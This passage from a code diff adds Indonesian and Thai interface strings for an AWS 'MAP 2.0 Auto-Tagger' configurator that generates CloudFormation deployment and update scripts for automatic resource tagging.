+            d_instr_what_bucket:'Menghapus bucket staging S3 hanya ketika tidak ada deployment MAP Auto-Tagger yang tersisa di region. Jika tidak, dipertahankan untuk menghindari memutus deployment sejenis.',
+            d_instr_logs_delete:'Menghapus CloudWatch Log Groups yang cocok.',
+            d_instr_logs_preserve:'CloudWatch Log Groups (riwayat audit dipertahankan).',
+            d_instr_preserved_title:'Dipertahankan (tidak pernah dihapus):',
+            d_instr_preserved_tags:'Tag map-migrated pada resource AWS (kredit MAP tetap utuh).',
+            d_instr_preserved_iam:'Peran IAM admin dan eksekusi StackSet (kerangka organisasi bersama).',
+            d_instr_idempotent:'Idempoten: aman untuk dijalankan ulang. Resource yang hilang dilaporkan sebagai dilewati, bukan gagal.',
+            ui_version_history_title:'Riwayat versi — apa yang berubah?',
+            ui_version_released:'Dirilis',
+            ui_version_current:'Target saat ini',
+            ui_version_full_changelog:'Changelog lengkap di GitHub',
+            ui_version_tag_bugfix:'Perbaikan bug',
+            ui_version_tag_coverage:'Cakupan baru',
+            ui_version_tag_breaking:'Perubahan besar',
+            ui_version_tag_security:'Keamanan',
+            ui_version_tag_perf:'Performa',
+            ui_version_tag_other:'Lainnya',
+            ui_editor_back:'← Kembali',
+            ui_editor_review:'Tinjau →',
+            ui_editor_review_title:'Tinjau Konfigurasi',
+            ui_editor_review_subtitle:'Verifikasi pengaturan Anda sebelum membuat skrip pembaruan',
+            ui_editor_review_accounts:'Akun',
+            ui_editor_confirm_text:'Saya mengonfirmasi bahwa MAP Auto-Tagger sudah di-deploy di wilayah yang dipilih menggunakan MPE ID yang ditentukan, dan kedua nilai tersebut sudah benar.',
+            ui_editor_confirm_risk:'Menghasilkan dan menjalankan skrip ini dengan informasi yang salah dapat memperbarui StackSet yang salah, merusak cakupan akun, atau menyebabkan sumber daya diberi tag dengan MAP engagement ID yang salah — yang mengakibatkan kredit MAP yang hilang tidak dapat dipulihkan secara retroaktif.',
+            err_editor_confirm:'Anda harus mengonfirmasi sebelum membuat skrip pembaruan',
+            ui_editor_generate:'Buat update.sh →',
+            ui_editor_step3_title:'Skrip Siap',
+            ui_editor_step3_subtitle:'Jalankan ini di AWS CloudShell dari akun manajemen',
+            ui_editor_download:'⬇ Unduh update.sh',
+            ui_editor_script_preview:'Pratinjau Skrip',
+            err_date_required:'Tanggal mulai perjanjian wajib diisi',
+            err_date_end:'Tanggal berakhir harus setelah tanggal mulai',
+            err_vpc_required:'Harap masukkan setidaknya satu VPC ID.',
+            err_vpc_format:'Format VPC ID tidak valid. Harus vpc- diikuti 8-17 karakter heksadesimal (contoh: vpc-0abc1234def56789).',
+            err_duplicate_vpc:'VPC ID duplikat terdeteksi. Hapus duplikat.',
+            err_central_account_required:'Harap masukkan ID akun pusat (12 digit).',
+            d_title:'Pengaturan MAP 2.0 Auto-Tagger',
+            d_tag_label:'Nilai Tag', d_region_label:'Region', d_account_label:'Akun',
+            d_step1:'Langkah 1 dari 3: Memeriksa akun Anda...',
+            d_step2:'Langkah 2 dari 3: Menyiapkan auto-tagger...',
+            d_step2_wait:'(Biasanya membutuhkan 1-2 menit)',
+            d_step2_wait_multi:'(Biasanya membutuhkan 10-15 menit)',
+            d_step3:'Langkah 3 dari 3: Menyimpan laporan deployment...',
+            d_ok_creds:'Berhasil terhubung ke akun AWS.',
+            d_fail_creds:'Tidak dapat terhubung ke akun AWS Anda.',
+            d_fix_creds:'Sesi Anda mungkin telah kedaluwarsa. Tutup dan buka kembali AWS CloudShell, lalu jalankan skrip ini kembali.',
+            d_ok_trail:'Pencatatan aktivitas diaktifkan di region:',
+            d_fail_trail:'Pencatatan aktivitas (CloudTrail) tidak diaktifkan di region:',
+            d_fix_trail1:'Buka AWS Console → CloudTrail → Buat trail.',
+            d_fix_trail2:'Pastikan menyertakan region:',
+            d_ok_perms:'Izin deployment sudah tersedia.',
+            d_fail_perms:'Akun Anda tidak memiliki izin deployment yang diperlukan.',
+            d_fix_perms:'Minta administrator AWS Anda untuk memberikan izin AWS CloudFormation, IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, dan Amazon CloudWatch.',
+            d_ok_org:'Berjalan dari akun yang benar (akun manajemen atau administrator yang didelegasikan).',
+            d_ok_org_delegated:'Berjalan sebagai administrator yang didelegasikan untuk CloudFormation StackSets.',
+            d_fail_org:'Skrip ini harus dijalankan dari akun manajemen organisasi atau akun administrator yang didelegasikan untuk CloudFormation StackSets.',
+            d_fix_org:'Beralih ke akun manajemen (atau akun admin yang didelegasikan) di AWS CloudShell dan jalankan skrip kembali. Jika tidak yakin, hubungi tim akun AWS Anda.',
+            d_warn_stacksets:'Integrasi deployment multi-akun belum diaktifkan — akan diatur otomatis saat deployment.',
+            d_ok_stacksets:'Integrasi deployment multi-akun sudah diaktifkan.',
+            d_ok_scp:'Tidak ada kebijakan keamanan yang memblokir layanan tag.',
+            d_ok_vpc:'VPC ada di akun ini:',
+            d_fail_vpc:'VPC tidak ditemukan di akun/region ini:',
+            d_fix_vpc:'Verifikasi ID VPC sudah benar dan ada di akun dan region target.',
+            d_ok_account_scope:'Akun ada di organisasi:',
+            d_fail_account_scope:'Akun tidak ditemukan di organisasi:',
+            d_fix_account_scope:'Verifikasi ID akun adalah akun 12 digit yang valid milik organisasi AWS Anda.',
+            d_fail_scp:'Kebijakan keamanan di organisasi Anda memblokir layanan tag.',
+            d_fix_scp:"Hubungi tim keamanan AWS Anda dan minta mereka mengizinkan tindakan 'tag:TagResources' untuk peran eksekusi Lambda.",
+            d_scp_note:"(Catatan: jika organisasi Anda mengharuskan tag ada saat resource dibuat, minta tim keamanan untuk mengecualikan kunci tag 'map-migrated'.)",
+            d_all_passed:'Semua pemeriksaan berhasil.',
+            d_checks_failed:'pemeriksaan gagal. Ikuti langkah-langkah di atas, lalu jalankan skrip kembali.',
+            d_fix_label:'→ Solusi:',
+            d_deploying:'Deployment sedang berjalan. Anda dapat menekan Ctrl+C dengan aman — akan terus berjalan di latar belakang.',
+            d_still_deploying:'Masih menyiapkan...',
+            d_elapsed:'telah berlalu',
+            d_deploy_failed:'Pengaturan gagal. Bagikan laporan di bawah ini ke tim akun AWS Anda.',
+            d_complete_title:'Pengaturan Selesai!',
+            d_complete_single:'Resource baru akan secara otomatis diberi tag dalam 1-2 menit setelah dibuat (hingga 15 menit pada jam sibuk).',
+            d_complete_multi:'Pemberian tag otomatis kini aktif di semua akun dalam organisasi Anda.',
+            d_backfill_msg:'Backfill akan segera berjalan.',
+            d_backfill_waiting:'Menunggu backfill selesai...',
+            d_backfill_wait_info:'(Backfill akan segera dimulai, mungkin membutuhkan hingga 15 menit)',
+            d_backfill_starting:'Backfill sedang berjalan...',
+            d_backfill_in_progress:'Backfill sedang berlangsung...',
+            d_backfill_timeout:'Backfill masih berjalan. Laporan telah disimpan — periksa CloudWatch untuk hasil akhir:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'Backfill selesai.',
+            r_backfill_result:'Hasil Backfill',
+            d_backfill_since:'Ini akan memberi tag pada resource yang dibuat sejak:',
+            d_report_saved:'Laporan deployment disimpan di:',
+            d_share_report:'Bagikan file ini ke tim akun AWS Anda.',
+            r_title:'MAP 2.0 Auto-Tagger — Laporan Deployment',
+            r_customer:'Pelanggan', r_mpe:'MPE ID', r_region:'Region', r_account:'Akun',
+            r_date:'Tanggal / Waktu', r_result:'Hasil',
+            r_preflight:'Hasil Pemeriksaan Awal:',
+            r_deployed:'Yang Telah Diinstal:',
+            r_verify:'Cara Verifikasi:',
+            r_backfill:'Status Backfill:',
+            r_perstatus:'Status Per-Akun:',
+            r_support:'Dukungan:',
+            r_action:'Tindakan yang Diperlukan:',
+            r_verify1:'1. Buat resource apa pun di akun AWS Anda',
+            r_verify2:'2. Tunggu 1-2 menit (hingga 15 menit saat jam sibuk)',
+            r_verify3:'3. Periksa bahwa resource memiliki tag: map-migrated =',
+            r_share_help:'Bagikan laporan ini ke tim akun AWS Anda jika membutuhkan bantuan.',
+            r_contact:'Hubungi tim akun AWS Anda jika membutuhkan bantuan.',
+            r_action_desc:'Selesaikan pemeriksaan yang gagal di atas, lalu jalankan kembali deploy.sh.'
+          },
+          th: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'ดาวน์โหลด',
+                        ui_instr_opt1_title:'ตัวเลือก 1: AWS CloudShell (แนะนำ)',
+            ui_instr_opt2_title:'ตัวเลือก 2: AWS CLI ในเครื่อง',
+            ui_instr_cli_prereq_single:'ตรวจสอบว่า AWS CLI v2 ติดตั้งและกำหนดค่าด้วยข้อมูลรับรองบัญชีการย้ายระบบของคุณ',
+            ui_instr_cli_prereq_multi:'ตรวจสอบว่า AWS CLI v2 ติดตั้งและกำหนดค่าด้วยข้อมูลรับรองบัญชีจัดการของคุณ',
+            ui_instr_cli_download:'ดาวน์โหลด deploy.sh ไปยังคอมพิวเตอร์ของคุณ',
+            ui_instr_cli_download_all:'ดาวน์โหลดไฟล์ทั้ง 3 ไฟล์ไปยังคอมพิวเตอร์ของคุณ',
+            ui_instr_cli_terminal:'เปิด Terminal (Linux/macOS) หรือ WSL/Git Bash (Windows)',
+            ui_cli_alt_short:'กำหนดค่า AWS CLI สำหรับบัญชีนั้นและรัน:',
+            ui_instr_single_title:'คำแนะนำการติดตั้ง — บัญชีเดียว',
+ui_instr_single_title:'คำแนะนำการติดตั้ง — บัญชีเดียว',
+            ui_instr_multi_title:'คำแนะนำการติดตั้ง — หลายบัญชี',
+            ui_instr_login_single:'เข้าสู่ระบบ AWS Console สำหรับบัญชีการย้ายระบบของคุณ',
+            ui_instr_login_multi:'เข้าสู่ระบบ AWS Console สำหรับบัญชีจัดการของคุณ',
+            ui_instr_open_cloudshell:'เปิด CloudShell (คลิกไอคอนเทอร์มินัลในแถบเมนูด้านบน)',
+            ui_instr_upload_files:'อัปโหลดไฟล์ (CloudShell → Actions → Upload file):',
+            ui_instr_upload_all:'อัปโหลดไฟล์ทั้ง 3 ไฟล์ (CloudShell → Actions → Upload file):',
+            ui_instr_run:'รัน:',
+            ui_instr_done_single:'เสร็จสิ้น สคริปต์จะทำการติดตั้งและแจ้งเมื่อเสร็จสมบูรณ์',
+            ui_instr_done_multi:'เสร็จสิ้น การติด Tag อัตโนมัติเปิดใช้งานแล้วในทุกบัญชี',
+            ui_instr_verify_title:'ตรวจสอบการทำงานของการติด Tag (หลังการติดตั้ง):',
+            ui_instr_expected:'ผลลัพธ์ที่คาดหวัง',
+            ui_instr_thats_it:'เสร็จแล้ว การติด Tag อัตโนมัติเปิดใช้งานสำหรับทรัพยากรที่รองรับกว่า 140 ประเภท',
+            ui_instr_existing_only:'ทรัพยากรที่มีอยู่ไม่ได้รับผลกระทบ — ใช้กับทรัพยากรที่สร้างใหม่เท่านั้น',
+            ui_instr_auto_handles:'สคริปต์จัดการทุกอย่างโดยอัตโนมัติ:',
+            ui_instr_uploads_s3:'อัปโหลดเทมเพลตไปยัง S3',
+            ui_instr_enables_stacksets:'เปิดใช้งาน StackSets ในองค์กรของคุณ',
+            ui_instr_discovers_org:'ค้นหาโครงสร้างองค์กรโดยอัตโนมัติ',
+            ui_instr_deploys_all:'ติดตั้งไปยังทุกบัญชี (~10 นาที)',
+            ui_instr_check_status:'ตรวจสอบสถานะหลังการรัน',
+            ui_instr_files_received:'คุณได้รับไฟล์ 3 ไฟล์',
+            ui_instr_target_accounts:'บัญชีเป้าหมาย',
+            ui_instr_all_accounts:'(ไม่ได้ระบุบัญชี)',
+            ui_instr_all_org:'บัญชีทั้งหมดในองค์กร',
+            ui_instr_cloudtrail_note:'หมายเหตุ: ต้องเปิดใช้งาน CloudTrail ในแต่ละบัญชีและ Region เป้าหมาย',
+            ui_sample_notice_title:'หมายเหตุเกี่ยวกับโค้ดตัวอย่าง:',
+            ui_sample_notice_body:"นี่คือโค้ดตัวอย่างสำหรับการใช้งานที่ไม่ใช่สภาพแวดล้อมการผลิต คุณมีหน้าที่รับผิดชอบในการทดสอบ รักษาความปลอดภัย และปรับแต่งโซลูชันนี้ให้ตรงตามข้อกำหนดด้านความปลอดภัย กฎระเบียบ และการปฏิบัติตามข้อกำหนดขององค์กรก่อนการติดตั้ง การติดตั้งโซลูชันนี้อาจมีค่าใช้จ่าย AWS สำหรับ AWS Lambda, Amazon EventBridge, Amazon CloudWatch, Amazon SNS, Amazon SQS และ AWS Systems Manager โปรดดู:",
+            ui_shared_responsibility:'โมเดลความรับผิดชอบร่วมกันของ AWS',
+            ui_btn_copy:'คัดลอกคำแนะนำ',
+            ui_one_file_step:'หนึ่งไฟล์ หนึ่งขั้นตอน',
+            ui_send_script:'ส่ง',
+            ui_to_customer:'ให้ลูกค้า',
+            ui_cloudshell_open:'ลูกค้าเปิด',
+            ui_in_account:'ใน',
+            ui_upload_and_run:'AWS CloudShell อัปโหลดไฟล์นี้ และรัน:',
+            ui_mgmt_account:'บัญชีจัดการ',
+            ui_migration_account_label:'บัญชีการย้ายระบบ',
+            d_log_pass:'สำเร็จ:',
+            d_log_fail:'ล้มเหลว:',
+            d_log_warn:'คำเตือน:',
+            ui_main_desc1:'สร้าง CloudFormation template ที่ติด Tag',
+            ui_main_desc2:'ให้ทรัพยากร AWS ใหม่โดยอัตโนมัติภายใน',
+            ui_main_desc3:'60–90 วินาที (สูงสุด 15 นาทีในช่วงที่มีการใช้งานสูง)',
+            ui_main_desc4:'หลังจากสร้าง',
+            ui_main_desc5:'รองรับ',
+            ui_main_desc6:'ประเภททรัพยากรครอบคลุมทุกบริการ AWS หลัก (ผ่านการทดสอบ E2E บน CT org)',
+            ui_main_desc7:'ค่าใช้จ่ายของลูกค้า:',
+            ui_step1:'1. ตั้งค่า', ui_step2:'2. ตรวจสอบ', ui_step3:'3. ดาวน์โหลด',
+            ui_card_deal_title:'รายละเอียดข้อตกลง MAP 2.0',
+            ui_card_deal_subtitle:'กรอกรายละเอียดข้อตกลง MAP จาก AWS Investments',
+            ui_customer_name:'ชื่อลูกค้า', ui_customer_name_hint:'(ใช้สำหรับสร้างชื่อไฟล์เท่านั้น)',
+            ui_customer_name_placeholder:'เช่น บริษัท ABC จำกัด',
+            ui_mpe_tag:'MAP Engagement ID',
+            ui_mpe_hint:'(รหัสตัวอักษรและตัวเลข 10 หลักจาก AWS Investments — เช่น: A1B2C3D4E5)',
+            ui_agree_start:'วันที่เริ่มต้นข้อตกลง', ui_agree_start_hint:'(วันที่เริ่มติด Tag ให้ทรัพยากร MAP 2.0)',
+            ui_agree_end:'วันที่สิ้นสุดข้อตกลง', ui_agree_end_hint:'(วันที่หยุดติด Tag ให้ทรัพยากรใหม่)',
+            ui_alert_email:'อีเมลแจ้งเตือน', ui_alert_email_hint:'(ไม่บังคับ — อีเมลสำหรับรับการแจ้งเตือนข้อผิดพลาด)',
+            ui_alert_email_missing_warn:'⚠️ ไม่ได้ตั้งค่าอีเมลแจ้งเตือน การแท็กล้มเหลว (IAM ปฏิเสธ, โควต้าแท็ก, service drift) จะถูกลบอย่างเงียบๆ — ไม่มี SNS และไม่มีปลายทาง DLQ alarm คุณสามารถเพิ่มผู้สมัครในภายหลังได้ผ่าน scripts/add_subscriber.sh หรือเรียกใช้ configurator อีกครั้ง\n\nดำเนินการต่อโดยไม่มีผู้สมัครแจ้งเตือนหรือไม่?',
+            ui_email_confirm_hint:'ลูกค้าต้องยืนยันอีเมลการสมัครสมาชิก AWS หลังการติดตั้ง',
+            ui_deploy_mode:'โหมดการติดตั้ง', ui_deploy_mode_subtitle:'เลือกจำนวนบัญชี AWS ที่ใช้สำหรับการย้ายระบบ',
+            ui_single_title:'บัญชีเดียว', ui_single_desc:'ติดตั้งในบัญชี AWS เดียว ใช้เวลาประมาณ 2 นาที',
+            ui_multi_title:'หลายบัญชี (AWS Organizations)', ui_multi_desc:'ติดตั้งพร้อมกันในทุกบัญชีของ AWS Organization ผ่าน StackSet',
+            ui_backfill_title:'การเติม Tag ย้อนหลังครั้งเดียว', ui_optional:'(ไม่บังคับ)',
+            ui_coverage_title:'ทรัพยากรที่จะได้รับ Tag',
+            ui_btn_next:'ถัดไป: ตรวจสอบ →', ui_btn_back:'← ย้อนกลับ', ui_btn_generate:'สร้างและดาวน์โหลด →',
+            ui_tagging_scope:'ขอบเขตการติด Tag', ui_vpc_scope_hint:'โดยค่าเริ่มต้น ทรัพยากรใหม่ทั้งหมดในบัญชีจะได้รับ Tag หากเวิร์กโหลดการย้ายระบบและเวิร์กโหลดอื่นใช้บัญชีเดียวกัน ให้ใช้การกำหนดขอบเขต VPC',
+            ui_vpc_limit:'จำกัดการติด Tag เฉพาะ VPC ที่ระบุ',
+            ui_tag_non_vpc:'ติด Tag ทรัพยากรที่ไม่ใช่ VPC ด้วย (S3, DynamoDB, Lambda, SNS, SQS เป็นต้น)',
+            ui_tag_non_vpc_hint:'บริการเหล่านี้ไม่มีการเชื่อมต่อ VPC แนะนำให้ติด Tag ทั้งหมดโดยไม่คำนึงถึงขอบเขต VPC เพื่อความครอบคลุมสำหรับ MAP',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'(เฉพาะทรัพยากรที่ผูกกับ VPC เหล่านี้จะได้รับ Tag)',
+            ui_add_vpc:'+ เพิ่ม VPC', ui_add_account:'+ เพิ่มบัญชี', ui_add_region:'+ เพิ่ม Region',
+            ui_migration_account_ids:'ID บัญชีการย้ายระบบ', ui_migration_account_ids_hint:'(สำหรับอ้างอิง — stack จะถูกติดตั้งไปยังทั้งองค์กรโดยอัตโนมัติ)',
+            ui_stackset_note:'Lambda ถูกติดตั้งไปยังทุกบัญชีในองค์กรผ่าน root OU โดยค่าเริ่มต้น ทรัพยากรของทุกบัญชีจะได้รับ Tag คุณสามารถเลือกจำกัดการติด Tag เฉพาะบัญชีที่ระบุได้',
+            ui_stackset_bucket_note:'การติดตั้งนี้จะสร้าง S3 bucket ชั่วคราว (auto-map-tagger-{account-id}) เพื่อจัดเก็บ CloudFormation template สำหรับ StackSet โดย bucket จะถูกเก็บไว้หลังการติดตั้ง เนื่องจาก StackSet ต้องการสำหรับการติดตั้งในบัญชีใหม่ที่เข้าร่วมองค์กรในอนาคต',
+            ui_account_limit:'จำกัดการติด Tag เฉพาะบัญชีที่ระบุเท่านั้น',
+            err_account_scope_required:'กรุณากรอก ID บัญชีอย่างน้อยหนึ่งรายการ',
+            err_account_format:'ID บัญชีไม่ถูกต้อง ต้องเป็นตัวเลข 12 หลักพอดี',
+            err_duplicate_account:'พบ ID บัญชีซ้ำ กรุณาลบรายการที่ซ้ำออก',
+            ui_central_account_id:'ID บัญชีกลาง', ui_central_account_id_hint:'(บัญชีที่ Lambda จะถูกติดตั้ง)',
+            ui_member_accounts:'บัญชีสมาชิกในขอบเขต MAP',
+            ui_deployment_regions:'Region ที่ติดตั้ง', ui_deployment_regions_hint:'(Region ที่ลูกค้าสร้างทรัพยากร)',
+            ui_backfill_strong:'ติด Tag ทรัพยากรที่มีอยู่ซึ่งสร้างตั้งแต่วันที่เริ่มต้นข้อตกลง',
+            ui_backfill_scope_note:'✓ ใช้ขอบเขตแล้ว: การเติม Tag ย้อนหลังจะทำตามการตั้งค่าขอบเขต VPC/บัญชีที่เลือกด้านบน',
+            ui_backfill_desc:'ติดตั้ง Lambda แบบครั้งเดียวที่ค้นหาประวัติ CloudTrail ตั้งแต่วันที่เริ่มต้นข้อตกลง และติด Tag ให้ทรัพยากรทั้งหมดที่สร้างก่อนติดตั้งโซลูชันนี้ จะรันอัตโนมัติประมาณ 5 นาทีหลังติดตั้ง',
+            ui_backfill_note:'หมายเหตุ: ประวัติ CloudTrail จำกัดที่ 90 วันล่าสุด ทรัพยากรที่สร้างก่อนช่วงเวลานั้นต้องติด Tag ด้วยตนเอง',
+            ui_coverage_subtitle:'140+ ประเภททรัพยากรที่ผ่านการทดสอบผ่าน CT org หลายบัญชี (4 บัญชี × 4 Region)',
+            ui_review_title:'ตรวจสอบการกำหนดค่า', ui_review_subtitle:'ตรวจสอบการตั้งค่าก่อนสร้างเทมเพลต',
+            ui_what_deployed:'สิ่งที่จะถูกติดตั้ง',
+            ui_template_ready:'เทมเพลตพร้อมแล้ว', ui_template_ready_subtitle:'แชร์สิ่งนี้พร้อมคำแนะนำการติดตั้งด้านล่างให้กับลูกค้า',
+            ui_prereq_title:'ข้อกำหนดเบื้องต้นของลูกค้า', ui_prereq_subtitle:'deploy.sh ที่สร้างขึ้นจะตรวจสอบสิ่งเหล่านี้โดยอัตโนมัติก่อนติดตั้ง:',
+            ui_prereq_cloudtrail:'ต้องเปิดใช้งาน CloudTrail ใน Region เป้าหมาย',
+            ui_prereq_perms:'ผู้ติดตั้งต้องมีสิทธิ์ AWS CloudFormation (IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch)',
+            ui_prereq_org:'บัญชีจัดการต้องเปิดใช้งาน AWS Organizations และ CloudFormation StackSets trusted access',
+            ui_scp_title:'⚠️ คำเตือนเกี่ยวกับนโยบายควบคุมบริการ (SCP)',
+            ui_scp_intro:'หากองค์กรของลูกค้าใช้ SCP โปรดตรวจสอบสิ่งต่อไปนี้ก่อนติดตั้ง:',
+            ui_deploy_instructions:'คำแนะนำการติดตั้งสำหรับลูกค้า',
+            ui_template_preview:'ตัวอย่างเทมเพลต', ui_download_template:'ดาวน์โหลด CloudFormation Template', ui_download_template_note:'ไม่บังคับ — สำหรับลูกค้าที่ต้องการตรวจสอบโค้ด CloudFormation ก่อนการ deploy', ui_start_over:'เริ่มต้นใหม่',
+            ui_cost_note:'ค่าใช้จ่ายรายเดือนโดยประมาณ: ', ui_cost_note2:' / บัญชี (การเรียก Lambda + CloudWatch) ไม่ต้องใช้ AWS Config',
+            ui_scp_tagging:'SCP การติด Tag — ตรวจสอบให้แน่ใจว่า SCP ไม่ปฏิเสธ tag:TagResources, ec2:CreateTags หรือการดำเนินการติด Tag อื่นๆ สำหรับ Lambda execution role deploy.sh จะรันการตรวจสอบ IAM simulation หลังการติดตั้ง แต่ SCP ต้องตรวจสอบด้วยตนเองใน AWS Organizations Console',
+            ui_scp_mandatory:'SCP บังคับติด Tag — หากSCP กำหนดให้ต้องมี Tag ตั้งแต่ตอนสร้าง Resource โซลูชันนี้จะไม่สามารถตอบสนองข้อกำหนดดังกล่าวได้ (Tag ถูกนำไปใช้ 60-90 วินาทีหลังสร้าง) ลูกค้าต้องยกเว้น Tag key map-migrated จากการบังคับใช้หรือกำหนดระยะเวลาผ่อนผัน',
+            rv_not_specified:'(ไม่ระบุ)', rv_none:'(ไม่มี)', rv_none_specified:'(ไม่ระบุ)',
+            rv_yes:'ใช่', rv_no:'ไม่', rv_disabled:'ปิดใช้งาน', rv_enabled:'เปิดใช้งาน',
+            rv_multi_method:'วิธีการหลายบัญชี', rv_stackset:'StackSet (Lambda ต่อบัญชี)', rv_central:'Lambda กลาง (ข้ามบัญชี)',
+            rv_target_accounts:'บัญชีเป้าหมาย', rv_tag_non_vpc:'ติด Tag บริการที่ไม่ใช่ VPC',
+            rv_all_resources:'ทรัพยากรทั้งหมดในบัญชีเป้าหมาย',
+            rv_backfill_enabled:'เปิดใช้งาน — ติด Tag ทรัพยากรที่มีอยู่ตั้งแต่วันที่เริ่มต้นข้อตกลง (~5 นาทีหลังติดตั้ง)',
+            rv_desc_single:'CloudFormation stack หนึ่งรายการ ติดตั้งโดยตรงในบัญชีของลูกค้า:',
+            rv_desc_stackset:'สร้างไฟล์สองไฟล์ ติดตั้งเทมเพลตบัญชีจัดการครั้งเดียว — ระบบจะค้นหาโครงสร้างองค์กรโดยอัตโนมัติและจัดเตรียมบัญชีที่ระบุ:',
+            rv_desc_central:'Lambda กลางในบัญชีเดียว + IAM Role ข้ามบัญชีในแต่ละบัญชีสมาชิก:',
+            rv_deploy_mgmt:'ติดตั้งในบัญชีจัดการ', rv_deploy_accounts:'อัปโหลดไปยัง S3 ติดตั้งในแต่ละบัญชี',
+            rv_targets:'เป้าหมาย', rv_specific_accounts:'บัญชีที่ระบุ', rv_targets_all:'กำหนดเป้าหมายบัญชีทั้งหมดในองค์กร',
+            rv_res_lambda:'AWS Lambda Function', rv_res_lambda_desc:'ติด Tag ทรัพยากรใหม่โดยอัตโนมัติภายใน 60-90 วินาทีหลังสร้าง',
+            rv_res_eventbridge:'Amazon EventBridge Rule', rv_res_eventbridge_desc:'จับ 200+ event Create/Run/Put/Publish ทั่วทุกบริการ',
+            rv_res_ssm:'AWS Systems Manager Parameter', rv_res_ssm_desc:'จัดเก็บ MAP ID วันที่ข้อตกลง การกำหนดค่าขอบเขต',
+            rv_res_iam:'IAM Role', rv_res_iam_desc:'สิทธิ์การติด Tag เฉพาะบริการกว่า 100 รายการ หลักการสิทธิ์น้อยที่สุด',
+            rv_res_dlq:'Amazon SQS Dead Letter Queue', rv_res_dlq_desc:'จับ event การติด Tag ที่ล้มเหลวเพื่อลองใหม่/ตรวจสอบ',
+            rv_res_sns:'Amazon SNS Topic + Amazon CloudWatch Alarm', rv_res_sns_desc:'แจ้งเตือนเมื่อเกิดข้อผิดพลาดในการติด Tag (มากกว่า 3 ครั้งใน 5 นาที)',
+            rv_res_custom:'Custom Resource (Lambda)', rv_res_custom_desc:'ค้นหา ID root OU โดยอัตโนมัติระหว่างติดตั้ง ลูกค้าไม่ต้องทำอะไร',
+            err_mpe_invalid:"MAP ID ต้องมีพอดี 10 ตัวอักษร ใช้ได้เฉพาะตัวอักษรภาษาอังกฤษพิมพ์ใหญ่ (A–Z) และตัวเลข (0–9) โดยต้องมีตัวอักษรและตัวเลขอย่างน้อยอย่างละ 1 ตัว",
+            ui_landing_title:'คุณต้องการทำอะไร?',
+            ui_landing_subtitle:'เลือกตัวเลือกเพื่อเริ่มต้น',
+            ui_mode_deploy_title:'ติดตั้ง MAP Auto-Tagger ใหม่',
+            ui_mode_deploy_desc:'สร้างสคริปต์ deployment สำหรับ engagement MAP 2.0 ใหม่ รองรับการ deploy แบบบัญชีเดียวและหลายบัญชี (AWS Organizations)',
+            ui_mode_edit_title:'แก้ไข deployment ที่มีอยู่',
+            ui_mode_edit_desc:'เพิ่มหรือลบบัญชี AWS ออกจากขอบเขตของ MAP Auto-Tagger ที่ติดตั้งแล้ว สร้างสคริปต์อัปเดต — ไม่จำเป็นต้อง deploy ใหม่ทั้งหมด',
+            ui_mode_edit_note:'สำหรับการ deploy หลายบัญชี (AWS Organizations) เท่านั้น',
+            ui_estep1:'1. ตั้งค่า', ui_estep2:'2. ตรวจสอบ', ui_estep3:'3. ดาวน์โหลด',
+            ui_editor_info:'เครื่องมือนี้แก้ไข deployment ที่มีอยู่ซึ่งสร้างโดย MAP Auto-Tagger Configurator โดยสร้างสคริปต์ update.sh ที่อัปเดตขอบเขตบัญชีโดยไม่ต้อง deploy ใหม่',
+            ui_editor_step1_title:'รายละเอียด Deployment',
+            ui_editor_step1_subtitle:'ป้อนรายละเอียดของ MAP Auto-Tagger deployment ที่มีอยู่ของคุณ',
+            ui_editor_mpe_hint:'— รหัสตัวอักษรและตัวเลข 10 หลักที่ต้องตรงกับ deployment เดิม',
+            ui_editor_region:'ภูมิภาค Deployment',
+            ui_editor_region_hint:'— ภูมิภาคที่ management stack ถูก deploy',
+            ui_editor_region_placeholder:'เลือกภูมิภาค...',
+            err_editor_region:'กรุณาเลือกภูมิภาค deployment',
+            ui_editor_action_title:'การดำเนินการ',
+            ui_editor_action_subtitle:'เลือกว่าจะเพิ่มหรือลบบัญชีออกจากขอบเขต MAP',
+            ui_editor_add_title:'เพิ่มบัญชีในขอบเขต MAP',
+            ui_editor_add_desc:'บัญชีที่เลือกจะเริ่มได้รับการติด tag MAP',
+            ui_editor_add_accounts_label:'ID บัญชีที่จะเพิ่ม',
+            ui_editor_add_accounts_hint:'— เฉพาะบัญชีที่ยังไม่อยู่ในขอบเขตปัจจุบัน',
+            err_editor_account:'กรุณาป้อน ID บัญชี 12 หลักที่ถูกต้องอย่างน้อยหนึ่งรายการ',
+            ui_editor_backfill_title:'รันการ backfill ใหม่สำหรับบัญชีที่เพิ่งเพิ่ม',
+            ui_editor_backfill_desc:'ค้นหาประวัติ CloudTrail ตั้งแต่วันที่เริ่มต้นข้อตกลงและติด tag ทรัพยากรที่มีอยู่ในบัญชีที่เพิ่งเพิ่ม รันโดยอัตโนมัติระหว่างการอัปเดต StackSet ผลลัพธ์ปรากฏใน CloudWatch Logs (map-auto-tagger-backfill)',
+            ui_editor_backfill_note:'หมายเหตุ: ประวัติ CloudTrail จำกัดอยู่ที่ 90 วันที่ผ่านมา ทรัพยากรที่สร้างก่อนหน้านั้นต้องติด tag ด้วยตนเอง',
+            ui_editor_remove_title:'ลบบัญชีออกจากขอบเขต MAP',
+            ui_editor_remove_desc:'บัญชีที่เลือกจะหยุดถูกติด tag tag ที่มีอยู่จะไม่ถูกลบ Lambda ยังคง deploy อยู่แต่ไม่ active สำหรับบัญชีเหล่านี้',
+            ui_editor_remove_accounts_label:'ID บัญชีที่จะลบ',
+            ui_editor_remove_accounts_hint:'— เฉพาะบัญชีที่อยู่ในขอบเขตปัจจุบัน',
+            ui_mode_update_title:'อัปเดตเป็นเวอร์ชันเทมเพลตล่าสุด',
+            ui_mode_update_desc:'อัปเกรดโค้ด Lambda, นโยบาย IAM และกฎ EventBridge เป็นเวอร์ชันเทมเพลตปัจจุบัน การกำหนดค่าขอบเขต (บัญชี, VPC, วันที่ในข้อตกลง) จะถูกรักษาไว้ ตรวจจับการ deploy แบบบัญชีเดียวและหลายบัญชีโดยอัตโนมัติ',
+            ui_ustep1:'1. กำหนดค่า',
+            ui_ustep2:'2. ตรวจสอบ',
+            ui_ustep3:'3. ดาวน์โหลด',
